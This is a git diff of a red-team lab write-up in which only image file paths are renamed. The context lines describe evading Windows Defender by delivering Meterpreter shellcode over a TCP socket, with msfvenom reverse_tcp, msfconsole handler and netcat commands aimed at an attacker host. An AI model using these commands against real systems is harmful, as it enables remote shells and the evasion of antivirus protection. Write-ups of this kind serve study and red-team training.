@@ -4,7 +4,7 @@
 
 If you've tried executing an out of the box meterpreter payload on the box with Windows Defender, you know it may get picked up right away as can be seen in the below gif:
 
-![](<../../.gitbook/assets/Peek 2019-05-07 21-40.gif>)
+![](../../.gitbook/assets/peek-2019-05-07-21-40.gif)
 
 This quick lab shows how I was able to execute the off the shelf meterpreter payload against the latest Windows Defender (7th of May at the time of writing) by delivering the shellcode over a TCP socket.
 
@@ -36,7 +36,7 @@ netstat -nat | findstr /i listen | findstr /i 443
 ```
 {% endcode %}
 
-![](<../../.gitbook/assets/Screenshot from 2019-05-07 20-45-02.png>)
+![](../../.gitbook/assets/screenshot-from-2019-05-07-20-45-02.png)
 
 Let's generate a staged meterpreter payload and output it to C format:
 
@@ -46,7 +46,7 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=443 -f c > mete
 ```
 {% endcode %}
 
-![](<../../.gitbook/assets/Screenshot from 2019-05-07 20-49-59.png>)
+![](../../.gitbook/assets/screenshot-from-2019-05-07-20-49-59.png)
 
 Let's setup an msf handler to catch the meterpreter session on the attacking machine:
 
@@ -56,7 +56,7 @@ msfconsole -x "use exploits/multi/handler; set lhost 10.0.0.5; set lport 443; se
 ```
 {% endcode %}
 
-![](<../../.gitbook/assets/Screenshot from 2019-05-07 22-23-33.png>)
+![](../../.gitbook/assets/screenshot-from-2019-05-07-22-23-33.png)
 
 We can now take the shellcode from the C file and echo it out as a binary data, pipe it to the victim machine (where a TCP socket is listening on 443) via netcat:
 
@@ -74,7 +74,7 @@ We are now ready to execute the attack. Below shows all of the above in action:
 4. Bottom right - attacker sends the shellcode to the victim over the wire via netcat
 5. Top right - msfconsole serves the second stage to the victim and establishes the meterpreter session
 
-![](<../../.gitbook/assets/Peek 2019-05-07 21-34.gif>)
+![](../../.gitbook/assets/peek-2019-05-07-21-34.gif)
 
 ## Conclusion
 
